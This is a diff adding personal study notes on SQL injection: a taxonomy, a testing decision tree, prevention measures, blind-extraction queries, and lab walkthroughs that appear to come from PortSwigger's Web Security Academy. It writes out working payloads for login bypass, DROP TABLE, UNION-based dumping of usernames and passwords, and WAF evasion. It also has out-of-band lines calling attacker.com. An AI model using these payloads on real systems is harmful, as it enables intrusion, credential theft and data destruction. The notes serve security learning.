@@ -1,0 +1,335 @@
+CHEAT-SHEET-FOR ALL DB -> https://portswigger.net/web-security/sql-injection/cheat-sheet
+## SQL  sumarry (type, how it work , more)
+
+
+	SQL Injection in Different Statement Types
+	|
+	|-- SELECT statement
+	|    |-- Purpose: Retrieve data from the database.
+	|    |-- Typical location: login forms, search boxes, product filters.
+	|    |-- Attack mindset:
+	|         |-- When you see data being fetched & displayed.
+	|         |-- Try payloads that manipulate WHERE clauses.
+	|    |-- Example Attack:
+	|         Input: ' OR '1'='1--
+	|         Query: SELECT * FROM users WHERE username='' OR '1'='1'--' AND 
+	password='';
+	|         Effect: Bypasses login, returns all users.
+	|
+	|-- INSERT statement
+	|    |-- Purpose: Add new records into the database.
+	|    |-- Typical location: registration forms, comments, feedback.
+	|    |-- Attack mindset:
+	|         |-- When user input is being stored.
+	|         |-- Try injecting extra values or breaking syntax.
+	|    |-- Example Attack:
+	|         Input: attacker', 'malicious@example.com'); DROP TABLE users;--
+	|         Query: INSERT INTO users (username,email) VALUES 
+	      ('attacker','malicious@example.com'); DROP TABLE users;--');
+	|         Effect: Executes extra command (data loss if stacked queries allowed).
+	|
+	|-- UPDATE statement
+	|    |-- Purpose: Modify existing records.
+	|    |-- Typical location: password reset, profile edit.
+	|    |-- Attack mindset:
+	|         |-- When modifying "your" account, can you target someone else’s?
+	|    |-- Example Attack:
+	|         Input: admin'--
+	|         Query: UPDATE users SET password='newpass' WHERE username='admin'--';
+	|         Effect: Attacker resets admin’s password.
+	|
+	|-- DELETE statement
+	|    |-- Purpose: Remove records from the database.
+	|    |-- Typical location: delete account, remove posts, clear cart.
+	|    |-- Attack mindset:
+	|         |-- When input decides "what to delete".
+	|         |-- Try payloads that broaden scope.
+	|    |-- Example Attack:
+	|         Input: 1 OR 1=1
+	|         Query: DELETE FROM orders WHERE id=1 OR 1=1;
+	|         Effect: Deletes all orders in the table (DoS).
+	|
+	|-- Risks (applies to all)
+	|    |-- SELECT: Data exfiltration (confidentiality breach).
+	|    |-- INSERT: Data pollution, persistent payloads (integrity).
+	|    |-- UPDATE: Unauthorized modifications, privilege escalation.
+	|    |-- DELETE: Mass destruction of data (availability).
+	|    |-- Decision workflow:
+	|         1. Look at app functionality (fetch/insert/edit/delete).
+	|         2. Map user action → SQL type.
+	|         3. Choose injection strategy + payload type.
+	
+
+		
+	Preventing SQL Injection
+	|
+	|-- Partially Effective Measures
+	|   |-- Escaping single quotes
+	|   |   |-- Fails with numeric data
+	|   |   |-- Fails with second-order SQLi
+	|   |
+	|   |-- Stored Procedures
+	|       |-- Vulnerable if code inside is unsafe
+	|       |-- Vulnerable if invoked unsafely
+	|       |-- Example: exec sp_RegisterUser 'joe', 'foo'; exec xp_cmdshell ...
+	|       |-- Overhead of rewriting queries
+	|
+	|-- Parameterized Queries
+	|   |-- Step 1: Define query structure with placeholders
+	|   |-- Step 2: Bind user input safely
+	|   |-- Example (unsafe): dynamic concatenation
+	|   |-- Example (safe): prepared statement with setString
+	|   |
+	|   |-- Provisos
+	|       |-- Must be used for all queries
+	|       |-- All parameters must be parameterized
+	|       |-- Placeholders cannot replace table/column names
+	|       |-- Placeholders cannot replace SQL keywords (ORDER BY, ASC, DESC)
+	|       |-- Use whitelist/validation when needed
+	|
+	|-- Defense in Depth
+	|   |-- Least Privilege database accounts
+	|   |-- Disable unnecessary database functionality
+	|   |-- Apply vendor patches and updates
+
+
+
+## type of sqli
+
+	SQL Injection
+	│
+	├── Classic SQLi
+	│   ├── In-band (Direct)
+	│   │   ├── Error-based
+	│   │   └── Union-based
+	│   │
+	│   ├── Blind
+	│   │   ├── Boolean-based (Content-based)
+	│   │   └── Time-based
+	│   │
+	│   └── Out-of-band
+	│       ├── DNS-based
+	│       └── HTTP-based
+	│
+	├── Advanced Variants
+	│   ├── Second-order SQLi
+	│   ├── Stored/Deferred SQLi
+	│   ├── Batch SQLi (multiple queries in one)
+	│   ├── Inline Queries / Stacked Queries
+	│   ├── Comment Injection
+	│   ├── White-space/Obfuscation tricks
+	│
+	├── Target-specific
+	│   ├── Authentication bypass
+	│   ├── Privilege escalation via SQLi
+	│   ├── File-system interaction (e.g. INTO OUTFILE)
+	│   ├── OS Command execution (via xp_cmdshell, etc.)
+	│   └── WAF/Filter bypass techniques
+	│
+	└── Special Forms
+	    ├── Blind with Heavy Functions (e.g. CAST, SUBSTRING, BENCHMARK)
+	    ├── Polyglot payloads (works across multiple DBs)
+	    ├── Logical/Boolean exploitation inside procedures
+	    └── Error-message leakage in dev/debug mode
+	
+
+------
+
+## how to test
+
+
+	helping to know the types : https://portswigger.net/web-security/sql-
+	injection/cheat-sheet 
+	
+	Parameter Found?  
+	   ↓
+	   #clasic Injection(Error, Union)
+	Error? 
+	   ├─ Yes → Error-based
+	   │        e.g. id=1'   → SQL syntax error
+	   │        e.g. id=1 AND (SELECT 1/0)-- 
+	   │
+	   ↓ No
+	Union Test 
+	   ├─ Works? Yes → Union-based
+	   │        e.g. id=1 UNION SELECT NULL-- how many columns?
+	   │        e.g. id=1 UNION SELECT @@version, user(), database()--
+	   |
+	   |
+	   ↓ No
+	#Blind Attack (boolean,time)
+	Boolean Test 
+	   ├─ Works? Yes → Boolean-based Blind
+	   │        e.g. id=1 AND 1=1--
+	   │        e.g. id=1 AND 1=2--
+	   │        e.g. id=1 AND SUBSTRING(database(),1,1)='a'-- is db version start a
+	   │
+	   ↓ No
+	Time Delay 
+	   ├─ Works? Yes → Time-based Blind
+	   │        MySQL:      id=1' AND SLEEP(5)--
+	   │        MSSQL:      id=1' WAITFOR DELAY '0:0:5'--      
+	   │        PostgreSQL: id=1' AND pg_sleep(5)--    ,    ID=1'|| pg_sleep(5) --
+	   │        Oracle:     id=1' AND dbms_pipe.receive_message('a',5)--
+	   |         
+	   │
+	   ↓ No
+	   #Out-of-band 
+	OOB Payload 
+	   ├─ Response? Yes → Out-of-Band SQLi
+	   │        MySQL:  id=1 AND LOAD_FILE('\\\\attacker.com\\abc')
+	   │        MSSQL:  id=1; exec xp_dirtree '\\attacker.com\abc'--
+	   │        Oracle: id=1 AND UTL_HTTP.request('http://attacker.com:8080/test')
+	   │
+	   ↓
+	Advanced (2nd order, stacked, WAF bypass)  
+	   ├─ Second-order: 
+	   │        e.g. signup username = test'-- 
+	   │        payload executes later in admin panel
+	   │
+	   ├─ Stacked queries:
+	   │        e.g. id=1; DROP TABLE users--
+	   │        e.g. id=1; INSERT INTO admin(user,pass) VALUES('hacker','123')--
+	   │
+	   └─ WAF/Obfuscation:
+	            e.g.  / * ! UNION * /  SELECT 1,2--
+	            e.g. UN/  ** /  ION SEL/ ** /ECT
+	            e.g. UNION%0aSELECT
+
+
+
+	
+	Beyond SQL Injection: Escalating Database Attack
+	│
+	├── Why escalation matters
+	│   ├── Applications use single DB account
+	│   ├── SQLi → total access
+	│   └── But escalation gives OS/network control
+	│
+	├── Escalation Opportunities
+	│   ├── Access other apps’ data
+	│   ├── Compromise OS
+	│   ├── Pivot inside network
+	│   ├── Outbound connections
+	│   └── User Defined Functions (UDFs)
+	│
+	├── Common Myth
+	│   └── DBs don't need protection → False
+	│
+	├── MS-SQL
+	│   ├── xp_cmdshell → OS commands
+	│   ├── Extended procs: xp_regread/xp_regwrite
+	│   └── Re-enable disabled features (sp_configure)
+	│
+	├── Oracle
+	│   ├── Vulnerable procedures (SQLi inside DBMS packages)
+	│   ├── Example: grant DBA to public
+	│   ├── UTL_FILE for file access
+	│   └── DBMS_JAVA.RUNJAVA → execute OS commands
+	│
+	└── MySQL
+	    ├── LOAD_FILE → read files
+	    ├── SELECT INTO OUTFILE → write files/backdoors
+	    └── UDFs → custom OS-level functions
+	
+	
+
+
+
+# TIPS of DB
+
+	Oracle ->
+	
+		 doesn't have inforamtion_schema.tables  it has for 
+		tables=   table_name FROM   all_tables
+		for columns= column_name FROM all_tab_columns
+	
+	SUBSTRING('string',start_point,Length)
+	SUBSTRING('Hello World', 7, 5) the output: 'World'
+
+	how work on blind(boolean):
+	1- what type of DB (Mysql, postgre,...) ->
+		MySQL: tracking=NdpS' AND LENGTH(database())>9 --
+		PostgreSQL: tracking=NdpS' AND LENGTH(current_database())>9--
+		MS SQL:tracking=NdpS' AND LEN(DB_NAME())>9--
+		Oracle:tracking=NdpS' AND  LENGTH((SELECT name FROM v$database))>9--
+	2- Discober the tables ->
+		A) Guessing length of table:  (SELECT LENGTH(table_name) FROM 
+		information_schema.tables WHERE table_schema = current_schema() LIMIT 1 
+		OFFSET 0) > 22--
+		B) Guessing name of first table:((SELECT SUBSTRING(table_name, 1,1) FROM 
+		information_schema.tables WHERE table_schema = current_schema() LIMIT 1 
+		OFFSET 0) = 'a'--
+		C) Guessing name of second table "change The OFFSET ":
+		 (SELECT SUBSTRING(table_name, 1, 1) FROM information_schema.tables WHERE 
+		 table_schema = current_schema() LIMIT 1 OFFSET 1) = 'a'--
+	3- Discover the columns -> 
+		A) Guessing first columns :
+		(SELECT SUBSTRING(column_name, 1, 1) FROM information_schema.columns 
+		WHERE table_name = 'users' LIMIT 1 OFFSET 0) = 'a'--
+		B) then Guessing second columns
+	4- Discover the content of table'user',culomns'username,passwd'(admin,carlos)
+		A) Guessing the length of username: (SELECT LENGTH(username) FROM users 
+		LIMIT 1 OFFSET 0) > 30--
+		B) Guessing the name of username: (SELECT SUBSTRING(username, 1, 1) FROM 
+		users LIMIT 1 OFFSET 0) = 'a'--
+		C) do the same thing for passwd: (SELECT SUBSTRING(password, 1, 1) FROM 
+		users LIMIT 1 OFFSET 0) = 'a'--
+		(SELECT SUBSTRING(username, 1, 1) FROM users LIMIT 1 OFFSET 1) = 'a'--
+	
+# labs
+
+Start test what is the version and type :
+	1-detect the bug 
+	2- how many columns  (' ORDER BY {count of columns} -- -) don't forget to change the comment because it doesn't work on all types of DB
+		
+	Oracle :  SELECT banner,NULL FROM v$version
+	Microsoft:	SELECT @@version,NULL    #I Add NULL only if i have 2 columns
+	PostgreSQL: SELECT version()
+	MySQL: SELECT @@version,NULL
+
+lab.1 -> 
+	i see /filter?category=Gifts  and this category retrieve data so let's try sqli i put ' in end | =Gifts' and it gives my error so it's vuln to sqli let's try ' OR 1=1 -- to make it true and show all thing in this category 
+
+lab.2 -> 
+	in login page i try to inject username 'cause it's retrieve data from SQL  , so let's try to login with  ' OR 1=1 --  | i loged in as admin with his cookie 
+
+lab.3 -> 
+	HINT : WE USE ORACLE DB , WHEN WE TRY TO USE SELECT MUST WRITE TABLE .  filter?category=Pets'  gives my error , let's try sqli i try to know how many columns in it 
+	filter?category=Pets' UNION SELECT  NULL,NULL FROM dual --  THIS doesn't display any error so it's return 2 columns but where is the value of them display in page? . let's make change the sqli be TO SHOW where data will represent 
+	filter?category=Pets' UNION SELECT 'ABDO1','ABDO2' FROM dual --  now i can show the place of data in my page  let's see the version of this SQl
+
+lab.4 ->
+	HINT : WE USE MYSQL DB .  when i inject in filter?category=Gifts' i show error so let's try to know all columns . filter?category=Gifts' UNION SELECT NULL %20 -- - this is not work , but why ? because the database has 2 columns not 1 let's try this filter?category=Gifts' UNION SELECT NULL,NULL %20 -- - it's work , but we need to know where my output display let's do filter?category=Gifts' UNION SELECT  'ABDO1','ABDO2'%20 -- - NOW we know the place of output 
+	let's show the version of DB filter?category=Gifts' UNION SELECT @@version,'ABDO2'  -- -
+
+lab.5 -> 
+	i detect the type of DB filter?category=Gifts' -- - IT'S (MYSQL,MORE....) 	
+	STEPS : use UNION  NULL to know how columns --> also you can use ORDER BY 2 -- -
+	replace NULL with   string to know where it display --> 
+	SELECT table_name,NULL FROM information_schema.tables --> To show all table 
+	SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_jvfdgt' -- -            -->  to show all columns in this table
+	UNION SELECT username_hqmkqc, password_xyz   FROM users_jvfdgt -- -   I can use limit to show to admin not all data  like FROM users_jvfdgt LIMIT 5 -- - .
+
+lab.6 -> 
+	LIKE  lab.5 but work on oracle  filter?category=Pets' UNION SELECT column_name,'p0' FROM all_tab_columns WHERE table_name='USERS_NAYHLR' -- -
+
+lab.7 -> 
+	WHY this not work /filter?category=Pets' UNION SELECT 'P1',NULL,NULL%20 --  #becuae_type_of_this_column_accept_only_number_not_strint_vice_versa
+	and this work   /filter?category=Pets' UNION SELECT NULL,NULL,NULL%20 --
+
+lab.8 -> 
+	also i leaned in this lab more about column type maybe one column accept number and the ather one accept strint and vice versa
+
+lab.9 ->
+	i found the column but it's display only one thing like passwd or username so i inject to know the version filter?category=Pets' UNION SELECT NULL, version() -- | then i search how ot use concat for postgreSQL.  i used concat -> /filter?category=Pets' UNION SELECT NULL,CONCAT(username ,':' , password) FROM users --   don't use double quote because most of DB consider it identifiers not string  CONCAT(username ,":" , password)  
+
+lab.10 ->
+	like lab.9 but i don't wanna use CONCAT() let's try something else | | -> filter?category=Pets' UNION SELECT 1,username || ':' || password FROM users LIMIT 8--
+	also don't forget single quote is string , double quote is identifier for DB 
+	filter?category=Pets' UNION SELECT 1,username || ':' || password FROM users ORDER BY ID LIMIT 1 OFFSET 1 --
+	ID -> the number of columns
+	LIMIT ->  the limit of display content (how many line you need to see LIMIT 1 will see only one line)
+	OFFSET -> skipping line (how many line do wanna skip OFFSET 3 skip first 3 line)
+
+lab.11 ->
